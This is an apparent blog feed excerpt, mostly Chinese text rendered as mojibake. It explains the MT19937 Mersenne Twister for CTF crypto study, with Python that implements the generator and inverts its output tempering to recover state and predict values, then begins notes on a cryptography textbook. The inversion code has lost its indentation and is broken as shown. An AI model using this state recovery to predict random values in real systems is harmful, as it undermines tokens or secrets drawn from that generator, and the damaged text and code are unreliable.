title="å®ç°æ­¥éª¤ï¼š"></a>å®ç°æ­¥éª¤ï¼š</h3><ol><li>è·å¾—åŸºç¡€çš„æ¢…æ£®æ—‹è½¬é“¾</li><li>å¯¹äºæ—‹è½¬é“¾è¿›è¡Œæ—‹è½¬ç®—æ³•</li><li>å¯¹æ—‹è½¬ç®—æ³•æ‰€å¾—ç»“æœè¿›è¡Œå¤„ç†</li></ol><h3 id="æ¶‰åŠå˜é‡ï¼š"><a href="#æ¶‰åŠå˜é‡ï¼š" class="headerlink" title="æ¶‰åŠå˜é‡ï¼š"></a>æ¶‰åŠå˜é‡ï¼š</h3><ul><li>$w:$ åŠ å¯†é•¿åº¦ï¼Œä»¥bitä¸ºå•ä½ï¼Œ$w$ä½æ•´æ•°</li><li>$n:$ é€’å½’é•¿åº¦</li><li>$m:$ å‘¨æœŸå‚æ•°ï¼Œç”¨äºç¬¬ä¸‰é˜¶æ®µçš„åç§»é‡</li><li>$a:$ æ—‹è½¬çŸ©é˜µçš„å‚æ•°</li><li>$r:$ ä½ä½æ©ç ï¼Œå³ä½ä½è¦æå–çš„ä½æ•°</li><li>$f:$ åˆå§‹åŒ–æ—‹è½¬é“¾æ‰€éœ€å‚æ•°</li><li>$b,c:$ TGFSRçš„æ©ç </li><li>$s,t:$ TGFSRçš„ä½ç§»é‡</li><li>$u,d,l:$ é¢å¤–çš„æ¢…æ£®æ—‹è½¬æ‰€éœ€è¦çš„æ©ç å’Œä½ç§»é‡</li></ul><h1 id="åŠ å¯†æ–¹æ³•"><a href="#åŠ å¯†æ–¹æ³•" class="headerlink" title="åŠ å¯†æ–¹æ³•"></a>åŠ å¯†æ–¹æ³•</h1><h2 id="1-åˆå§‹åŒ–"><a href="#1-åˆå§‹åŒ–" class="headerlink" title="1.åˆå§‹åŒ–"></a>1.åˆå§‹åŒ–</h2><p>å°†ä¼ å…¥çš„seedèµ‹å€¼ç»™$MT_0$ä½œä¸ºåˆå§‹å€¼ï¼Œå¹¶ä¸”é€’æ¨å¾—åˆ°æ—‹è½¬é“¾<br><strong>é€’æ¨å¼ï¼š</strong> $MT_I&#x3D;f\times [(MT_{i-1})\oplus((MT_{i-1})&gt;&gt;(w-2))]+i$</p><h2 id="2-æ—‹è½¬ç®—æ³•"><a href="#2-æ—‹è½¬ç®—æ³•" class="headerlink" title="2.æ—‹è½¬ç®—æ³•"></a>2.æ—‹è½¬ç®—æ³•</h2><p>è¿æ¥$MT_i$çš„é«˜$w-r$ä½å’Œ$MT_{i+1}$çš„ä½$r$ä½ï¼Œè‹¥è¿™ä¸ªç»„åˆåçš„äºŒè¿›åˆ¶æ•°æœ«ä½ä¸º0ï¼Œå°†å…¶é™¤ä»¥2ã€‚å¦åˆ™å°†è¿™ä¸ªæ•°é™¤ä»¥2åå†ä¸$a$è¿›è¡Œå¼‚æˆ–ã€‚å‡è®¾æˆ‘ä»¬æœ€ç»ˆå¾—åˆ°çš„æ•°å­—ä¸º$P$<br>æˆ‘ä»¬å¾—åˆ°é€’æ¨å¼ä¸º$MT_i&#x3D;MT_{i+m}\oplus P$</p><h2 id="3-ç»“æœå¤„ç†"><a href="#3-ç»“æœå¤„ç†" class="headerlink" title="3.ç»“æœå¤„ç†"></a>3.ç»“æœå¤„ç†</h2><p>è®¾$x$æ˜¯è¯¥åºåˆ—çš„ä¸‹ä¸€ä¸ªå€¼ï¼Œ$y$æ˜¯ä¸€ä¸ªä¸­é—´å˜é‡ï¼Œ$z$æ˜¯ç®—æ³•çš„è¿”å›å€¼ã€‚<br>å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">y = x ^ ((x&gt;&gt;u) &amp; d)<br>y = y ^ ((y&lt;&lt;s) &amp; b)<br>y = y ^ ((y&lt;&lt;t) &amp; c)<br>z = y ^ (y&gt;&gt;l)<br></code></pre></td></tr></table></figure><h2 id="ä»£ç å¦‚ä¸‹ï¼š"><a href="#ä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="ä»£ç å¦‚ä¸‹ï¼š"></a>ä»£ç å¦‚ä¸‹ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MT19937</span>:<br>    <span class="hljs-comment"># æ ¹æ®seedåˆå§‹åŒ–624çš„state</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">624</span><br>        <span class="hljs-variable language_">self</span>.mt[<span class="hljs-number">0</span>] = seed<br>        <span class="hljs-variable language_">self</span>.mti = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">624</span>):<br>            <span class="hljs-variable language_">self</span>.mt[i] = _int32(<span class="hljs-number">1812433253</span> * (<span class="hljs-variable language_">self</span>.mt[i - <span class="hljs-number">1</span>] ^ <span class="hljs-variable language_">self</span>.mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br> <br>    <span class="hljs-comment"># æå–ä¼ªéšæœºæ•°</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.mti == <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.twist()<br>        y = <span class="hljs-variable language_">self</span>.mt[<span class="hljs-variable language_">self</span>.mti]<br>        y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>        y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>        <span class="hljs-variable language_">self</span>.mti = (<span class="hljs-variable language_">self</span>.mti + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>        <span class="hljs-keyword">return</span> _int32(y)<br> <br>    <span class="hljs-comment"># å¯¹çŠ¶æ€è¿›è¡Œæ—‹è½¬</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>            y = _int32((<span class="hljs-variable language_">self</span>.mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (<span class="hljs-variable language_">self</span>.mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>))<br>            <span class="hljs-variable language_">self</span>.mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-variable language_">self</span>.mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br> <br>            <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>                <span class="hljs-variable language_">self</span>.mt[i] = <span class="hljs-variable language_">self</span>.mt[i] ^ <span class="hljs-number">0x9908b0df</span><br></code></pre></td></tr></table></figure><h1 id="è§£å¯†æ–¹æ³•"><a href="#è§£å¯†æ–¹æ³•" class="headerlink" title="è§£å¯†æ–¹æ³•"></a>è§£å¯†æ–¹æ³•</h1><p><strong>å…³é”®ï¼š</strong> æ±‚å‡ºä¸€ä¸ªå‘¨æœŸå†…çš„å…¨éƒ¨å†…å®¹ï¼Œç„¶åä¾¿å¯ä»¥æ¨å‡ºå‰é¢çš„æ‰€æœ‰æƒ…å†µ</p><h2 id="1-é€†å‘ç¬¬å››æ­¥"><a href="#1-é€†å‘ç¬¬å››æ­¥" class="headerlink" title="1.é€†å‘ç¬¬å››æ­¥"></a>1.é€†å‘ç¬¬å››æ­¥</h2><p>$z &#x3D; y \oplus (y&gt;&gt;l)$ï¼Œæ±‚$y$</p><ul><li><strong>é«˜$l$ä½ï¼š</strong> å¯ä»¥çœ‹å‡º$y$çš„é«˜$l$ä½ä¾¿æ˜¯$z$çš„é«˜$l$ä½</li><li><strong>é«˜$l\sim 2l$ä½ï¼š</strong> ç”±$z$çš„é«˜$(l\sim 2l)\oplus yçš„é«˜lä½$å¾—åˆ°$yçš„é«˜l\sim 2lä½$</li><li><strong>é«˜$il\sim (i+1)l$ä½ï¼š</strong> åŒä¸Šç”±$z$çš„é«˜$(il\sim (i+1)l)\oplus y$çš„é«˜$[(i-1)l]\sim il$ä½å¾—åˆ°</li></ul><h2 id="2-é€†å‘ç¬¬ä¸‰æ­¥"><a href="#2-é€†å‘ç¬¬ä¸‰æ­¥" class="headerlink" title="2.é€†å‘ç¬¬ä¸‰æ­¥"></a>2.é€†å‘ç¬¬ä¸‰æ­¥</h2><p>$y_1 &#x3D; y \oplus ((y&lt;&lt;t) \land c)$ï¼Œæ±‚$y$</p><ul><li><strong>ä½$t$ä½ï¼š</strong> å¯ä»¥çœ‹å‡º$y_1$çš„ä½$t$ä½ä¾¿æ˜¯$y$çš„ä½$t$ä½<strong>å¼‚æˆ–</strong>$c$çš„ä½$t$ä½</li><li><strong>ä½$it\sim (i+1)t$ä½ï¼š</strong> ç”±$y_1$çš„ä½$it\sim (i+1)t$ä½ä¸$yçš„(i-1)\sim it$ä½ä¸$c$çš„$it\sim (i+1)t$çš„<strong>å¹¶çš„å¼‚æˆ–</strong></li></ul><h2 id="3-é€†å‘ç¬¬äºŒã€ä¸€æ­¥"><a href="#3-é€†å‘ç¬¬äºŒã€ä¸€æ­¥" class="headerlink" title="3.é€†å‘ç¬¬äºŒã€ä¸€æ­¥"></a>3.é€†å‘ç¬¬äºŒã€ä¸€æ­¥</h2><p>ä¸ä¸ŠåŒç†ï¼Œæ€»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># right shift inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res, shift, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &gt;&gt; shift  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># right shift with mask inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_mask</span>(<span class="hljs-params">res, shift, mask, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &gt;&gt; shift &amp; mask  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># left shift inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res, shift, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &lt;&lt; shift  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># left shift with mask inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_mask</span>(<span class="hljs-params">res, shift, mask, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &lt;&lt; shift &amp; mask  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">y</span>):  <br>y = y ^ y &gt;&gt; <span class="hljs-number">11</span>  <br>y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span>  <br>y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span>  <br>y = y ^ y &gt;&gt; <span class="hljs-number">18</span>  <br><span class="hljs-keyword">return</span> y&amp;<span class="hljs-number">0xffffffff</span>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>(<span class="hljs-params">y</span>):  <br>y = inverse_right(y,<span class="hljs-number">18</span>)  <br>y = inverse_left_mask(y,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)  <br>y = inverse_left_mask(y,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)  <br>y = inverse_right(y,<span class="hljs-number">11</span>)  <br><span class="hljs-keyword">return</span> y&amp;<span class="hljs-number">0xffffffff</span>  <br><span class="hljs-built_in">print</span>(recover(<span class="hljs-number">0xf1c680f8</span>))  <br><span class="hljs-string">&#x27;&#x27;&#x27;  </span><br><span class="hljs-string">for i in s:  </span><br><span class="hljs-string">print(recover(i))  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">y = extract_number(o)  </span><br><span class="hljs-string">print(&#x27;y=&#x27;,y,&#x27;o=&#x27;,o)  </span><br><span class="hljs-string">print(recover(y) == o)  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¯¹äºMT32çš„ä¸€äº›å‚æ•°ï¼š<br>$(w,n,m,r)&#x3D;(32,624,397,31)$<br>$(a,f)&#x3D;(9908B0DF_h,1812433253)$<br>$(u,d,s,b,t,c)&#x3D;(11,FFFFFFFF_h),7,9D2C5680_h,15,EFC60000_h$<br>$l&#x3D;18$</p></blockquote><h1 id="å¸¸è§é¢˜å‹"><a href="#å¸¸è§é¢˜å‹" class="headerlink" title="å¸¸è§é¢˜å‹"></a>å¸¸è§é¢˜å‹</h1><h2 id="1-é€†å‘éšæœºæ•°äº§ç”Ÿå™¨å†…éƒ¨çš„stateä¸­çš„å†…å®¹"><a href="#1-é€†å‘éšæœºæ•°äº§ç”Ÿå™¨å†…éƒ¨çš„stateä¸­çš„å†…å®¹" class="headerlink" title="1.é€†å‘éšæœºæ•°äº§ç”Ÿå™¨å†…éƒ¨çš„stateä¸­çš„å†…å®¹"></a>1.é€†å‘éšæœºæ•°äº§ç”Ÿå™¨å†…éƒ¨çš„stateä¸­çš„å†…å®¹</h2><h2 id="2-é¢„æµ‹åé¢çš„éšæœºæ•°"><a href="#2-é¢„æµ‹åé¢çš„éšæœºæ•°" class="headerlink" title="2.é¢„æµ‹åé¢çš„éšæœºæ•°"></a>2.é¢„æµ‹åé¢çš„éšæœºæ•°</h2><h2 id="3-æ±‚å‡ºä¹‹å‰çš„éšæœºæ•°"><a href="#3-æ±‚å‡ºä¹‹å‰çš„éšæœºæ•°" class="headerlink" title="3.æ±‚å‡ºä¹‹å‰çš„éšæœºæ•°"></a>3.æ±‚å‡ºä¹‹å‰çš„éšæœºæ•°</h2><p><strong>å‚è€ƒ</strong>ï¼š<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">Explore MT19937 - huangx607087â€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Introduction To Modern Cryptographyå­¦ä¹ éšç¬”</title>
    <link href="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"/>
    <url>/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>åœ¨è€å¸ˆçš„æ¨èä¸‹ï¼Œæˆ‘å­¦ä¹ äº†ã€ŠIntroduction To Modern Cryptographyã€‹ä¸€ä¹¦çš„éƒ¨åˆ†å†…å®¹ï¼Œæœ¬æ–‡ç”¨æ¥è®°å½•é˜…è¯»è¿‡ç¨‹ä¸­çš„ä¸€äº›éšç¬”ï¼Œå¯èƒ½ä¼šæœ‰äº›æ½¦è‰ï¼Œå¦‚æœå¾€åæœ‰äº†æ›´æ·±çš„è®¤è¯†ï¼Œä¼šå›æ¥ç»§ç»­å®Œå–„ã€‚</p><p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å¤§ç¯‡å¹…é˜…è¯»è‹±æ–‡ä¹¦ç±ï¼Œåˆšå¼€å§‹è¯»ç¡®å®æ¯”è¾ƒéš¾ä»¥æ¥å—ï¼Œå› ä¸ºè¦é¢‘ç¹åœ°æœç´¢ä¸€äº›å•è¯å«ä¹‰ï¼Œæœ‰æ—¶å€™ä¸€äº›åœ°æ–¹ä¸­æ–‡ç¿»è¯‘ä¹‹åä¸åŸæ–‡å«ä¹‰ç›¸å·®ç”šè¿œï¼Œå› æ­¤è¿˜æ˜¯ç¡¬ç€å¤´çš®å¤§æ¦‚è¿‡äº†ä¸€ä¸‹åŸæ–‡ã€‚<br>è¯»çš„è¿‡ç¨‹ä¸­æˆ‘å‘ç°æœ¬ä¹¦ä¼šèŠ±è´¹å¤§é‡çš„ç¯‡å¹…å»è®ºè¿°ä¸€ä¸ªå®šä¹‰ï¼Œå¾ˆé€‚åˆåˆå­¦è€…å»æ¥è§¦ç†è§£æ¯ä¸ªå®šä¹‰çš„æ·±å±‚æ¬¡å«ä¹‰ã€‚</p><h1 id="3-ç§é’¥å¯†ç "><a href="#3-ç§é’¥å¯†ç " class="headerlink" title="3.ç§é’¥å¯†ç "></a>3.ç§é’¥å¯†ç </h1><h2 id="3-1-è®¡ç®—å®‰å…¨æ€§"><a href="#3-1-è®¡ç®—å®‰å…¨æ€§" class="headerlink" title="3.1 è®¡ç®—å®‰å…¨æ€§"></a>3.1 è®¡ç®—å®‰å…¨æ€§</h2><p><strong>è®¡ç®—å®‰å…¨ç›¸å¯¹äºä¿¡æ¯è®ºå®‰å…¨ï¼ˆå®Œç¾å®‰å…¨ï¼‰åŒ…å«ä¸¤ä¸ªæ”¾æ¾</strong></p><ul><li>ä»…é’ˆå¯¹æœ‰æ•ˆæ”»å‡»è€…ï¼ˆåˆç†æ—¶é—´æˆ–æœ‰é™èµ„æºï¼‰</li><li>å…è®¸æ”»å‡»è€…æœ‰è¾ƒå°æ¦‚ç‡æˆåŠŸï¼ˆæ¦‚ç‡è¶³å¤Ÿå°ï¼Œå¯å¿½ç•¥ä¸è®¡ï¼‰</li></ul><h3 id="3-1-1-å…·ä½“æ–¹æ³•"><a href="#3-1-1-å…·ä½“æ–¹æ³•" class="headerlink" title="3.1.1 å…·ä½“æ–¹æ³•"></a>3.1.1 å…·ä½“æ–¹æ³•</h3><p>è®¡ç®—å®‰å…¨çš„å…·ä½“æ–¹æ³•é€šè¿‡æ˜ç¡®é™å®š<strong>æ—¶é—´</strong>å’Œ<strong>è®¡ç®—èµ„æº</strong>ä¸‹ï¼Œæ”»å‡»è€…çš„æœ€å¤§æˆåŠŸæ¦‚ç‡ï¼Œæ¥é‡åŒ–åŠ å¯†æ–¹æ¡ˆçš„å®‰å…¨æ€§ã€‚å…·ä½“çš„å®‰å…¨æ€§å®šä¹‰å½¢å¼å¦‚ä¸‹ï¼š</p><ul><li>å¦‚æœä»»æ„ä¸€ä¸ªæ—¶é—´ä¸Šé™ä¸º$t$çš„æ”»å‡»è€…éƒ½ä¸èƒ½ä»¥æˆåŠŸæ¦‚ç‡é«˜äº$\epsilon$çš„æ¦‚ç‡ç ´è§£åŠ å¯†æ–¹æ¡ˆï¼Œè¿™ä¸ªæ–¹æ¡ˆä¾¿æ˜¯$(t,\epsilon)-å®‰å…¨$ çš„ã€‚</li></ul><h3 id="3-1-2-æ¸è¿‘æ–¹æ³•"><a href="#3-1-2-æ¸è¿‘æ–¹æ³•" class="headerlink" title="3.1.2 æ¸è¿‘æ–¹æ³•"></a>3.1.2 æ¸è¿‘æ–¹æ³•</h3><p>å…·ä½“å®‰å…¨æ€§æ–¹æ³•å­˜åœ¨ä¸€äº›æŠ€æœ¯å’Œç†è®ºä¸Šçš„å›°éš¾ã€‚å› æ­¤åœ¨æŠ½è±¡æè¿°æ–¹æ¡ˆæ—¶ä½¿ç”¨ï¼Œä½¿ç”¨æ¸è¿‘æ–¹æ³•ã€‚å¼•å…¥å®‰å…¨æ€§å‚æ•°$n$ï¼Œå¹¶è®©å…¶ä¸å¯†é’¥é•¿åº¦å¯¹åº”ï¼ŒæŠŠå¯¹æ‰‹çš„è¿è¡Œæ—¶é—´å’ŒæˆåŠŸæ¦‚ç‡è§†ä¸ºå®‰å…¨å‚æ•°çš„å‡½æ•°ã€‚</p><h4 id="æ¸è¿‘æ³•è¯¦ç»†è¯´æ˜"><a href="#æ¸è¿‘æ³•è¯¦ç»†è¯´æ˜" class="headerlink" title="æ¸è¿‘æ³•è¯¦ç»†è¯´æ˜"></a>æ¸è¿‘æ³•è¯¦ç»†è¯´æ˜</h4><ul><li><strong>æœ‰æ•ˆç®—æ³•ï¼š</strong> å°†â€œæœ‰æ•ˆå¯¹æ‰‹â€ç­‰åŒäºè¿è¡Œæ—¶é—´åœ¨$n$çš„å¤šé¡¹å¼å†…çš„éšæœºåŒ–ï¼ˆå³æ¦‚ç‡æ€§ï¼‰ç®—æ³•ã€‚è¿™æ„å‘³ç€å­˜åœ¨æŸä¸ªå¤šé¡¹å¼$p$ï¼Œå½“å®‰å…¨å‚æ•°ä¸º$n$æ—¶ï¼Œå¯¹æ‰‹çš„è¿è¡Œæ—¶é—´ä¸è¶…è¿‡$p(n)$ã€‚</li><li><strong>å¯å¿½ç•¥æˆåŠŸç‡ï¼š</strong> å°†â€œæˆåŠŸæ¦‚ç‡å°â€è¿™ä¸€æ¦‚å¿µç­‰åŒäºå°äº$n$çš„ä»»ä½•é€†å¤šé¡¹å¼çš„æˆåŠŸæ¦‚ç‡ã€‚å³$\epsilon &lt; \frac{1}{p(n)}$</li></ul><blockquote><p><strong>å¤šé¡¹å¼æ—¶é—´ï¼š</strong> æ—¶é—´å¤æ‚åº¦ä¸º$O(1)ã€O(nlog_n)ã€O(n^k)ï¼Œå…¶ä¸­kä¸ºæŸä¸ªå¸¸æ•°$ï¼Œç­‰å½¢å¼æ‰€éœ€è¦çš„æ—¶é—´çš„ä¸ºå¤šé¡¹å¼æ—¶é—´ã€‚<br><strong>éï¼ˆè¶…ï¼‰å¤šé¡¹å¼æ—¶é—´ï¼š</strong> å¦‚æ—¶é—´å¤æ‚ä¸º$O(n!)ã€O(a^n)$ï¼Œç­‰ç®—æ³•æ‰€éœ€è¦çš„æ—¶é—´ä¸ºéï¼ˆè¶…ï¼‰å¤šé¡¹å¼æ—¶é—´ã€‚</p></blockquote><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><strong>ä»»ä½•å®‰å…¨å®šä¹‰ç”±ä¸¤éƒ¨åˆ†ç»„æˆ</strong>ï¼š</p><ul><li>å¯¹æ–¹æ¡ˆçš„â€œæ”»ç ´â€ï¼ˆå³å®‰å…¨ç›®æ ‡ï¼‰</li><li>å¯¹å¯¹æ‰‹èƒ½åŠ›çš„è¯¦ç»†è¯´æ˜ï¼ˆå³å¨èƒæ¨¡å‹ï¼‰</li></ul><p><strong>æ¸è¿‘å®‰å…¨å®šä¹‰ï¼š</strong><br>å¦‚æœæ¯ä¸ªpptæ”»å‡»è€…Aæ‰§è¡ŒæŸä¸ªç‰¹å®šç±»å‹çš„æ”»å‡»ï¼Œå¯¹äºæ¯ä¸ªå¤šé¡¹å¼$p(Â·)$ï¼Œå­˜åœ¨ä¸€ä¸ªæ•´æ•°$N$ï¼Œå½“å®‰å…¨å‚æ•°$n$å¤§äº$N$æ—¶ï¼Œæ”»å‡»è€…æˆåŠŸç ´è§£çš„æ¦‚ç‡å°äº$\frac {1}{p(n)}$â€‹ï¼ŒæˆåŠŸæ¦‚ç‡å°äº$\frac {1}{p(n)}$ï¼Œåˆ™è¿™ä¸ªæ–¹æ¡ˆæ˜¯å®‰å…¨çš„ã€‚</p><blockquote><p><strong>pptæ”»å‡»è€…</strong>ï¼šå³â€œæ¦‚ç‡å¤šé¡¹å¼æ—¶é—´ï¼ˆprobabilistic polynomial-timeï¼‰æ”»å‡»è€…â€ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…æ˜¯ä¸€ä¸ªéšæœºåŒ–ç®—æ³•ï¼Œå…¶è¿è¡Œæ—¶é—´æ˜¯å®‰å…¨å‚æ•°nçš„å¤šé¡¹å¼å‡½æ•°ã€‚</p></blockquote><h4 id="è®ºæ¸è¿‘å®‰å…¨çš„å®šä¹‰é€‰æ‹©"><a href="#è®ºæ¸è¿‘å®‰å…¨çš„å®šä¹‰é€‰æ‹©" class="headerlink" title="è®ºæ¸è¿‘å®‰å…¨çš„å®šä¹‰é€‰æ‹©"></a>è®ºæ¸è¿‘å®‰å…¨çš„å®šä¹‰é€‰æ‹©</h4><p><strong>ä¸¤ä¸ªé€‰æ‹©ï¼š</strong></p><ul><li>å°†æœ‰æ•ˆçš„å¯¹æŠ—ç­–ç•¥ä¸æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´ç®—æ³•ç›¸å¯¹åº”ï¼Œ</li><li>å°†å°çš„æˆåŠŸæ¦‚ç‡ç­‰åŒäºå¯å¿½ç•¥çš„æ¦‚ç‡</li></ul><h4 id="å®½æ¾çš„å¿…è¦æ€§"><a href="#å®½æ¾çš„å¿…è¦æ€§" class="headerlink" title="å®½æ¾çš„å¿…è¦æ€§"></a>å®½æ¾çš„å¿…è¦æ€§</h4><p><strong>å®Œç¾å®‰å…¨çš„é™åˆ¶ï¼š</strong> å¯†é’¥ç©ºé—´|K|å¿…é¡»å’Œå¯†æ–‡ç©ºé—´|M|ä¸€æ ·å¤§ï¼Œä¸ç°å®ã€‚</p><h2 id="3-2-å®šä¹‰è®¡ç®—å®‰å…¨åŠ å¯†"><a href="#3-2-å®šä¹‰è®¡ç®—å®‰å…¨åŠ å¯†" class="headerlink" title="3.2 å®šä¹‰è®¡ç®—å®‰å…¨åŠ å¯†"></a>3.2 å®šä¹‰è®¡ç®—å®‰å…¨åŠ å¯†</h2><p>é’ˆå¯¹ç§é’¥åŠ å¯†çš„è®¡ç®—å®‰å…¨æ€§å®šä¹‰</p><h3 id="3-2-1-åŸºæœ¬å®‰å…¨å®šä¹‰ï¼ˆEAVå®‰å…¨ï¼‰"><a href="#3-2-1-åŸºæœ¬å®‰å…¨å®šä¹‰ï¼ˆEAVå®‰å…¨ï¼‰" class="headerlink" title="3.2.1 åŸºæœ¬å®‰å…¨å®šä¹‰ï¼ˆEAVå®‰å…¨ï¼‰"></a>3.2.1 åŸºæœ¬å®‰å…¨å®šä¹‰ï¼ˆEAVå®‰å…¨ï¼‰</h3><blockquote><p>EAVå®‰å…¨ï¼šå³Eavesdropper Attack Securityï¼Œæ”»å‡»è€…ä»…è§‚å¯Ÿå•ä¸ªå¯†æ–‡ï¼Œæ ¸å¿ƒåœ¨äºä¸å¯åŒºåˆ†æ€§ã€‚</p></blockquote><p>é’ˆå¯¹ä»…å¯†æ–‡æ”»å‡»çš„å®‰å…¨æ€§ï¼Œå³å¯¹æ‰‹åªè§‚å¯Ÿåˆ°å¯†æ–‡ï¼Œæˆ–è€…ç»™å®šå¯†é’¥åªèƒ½åŠ 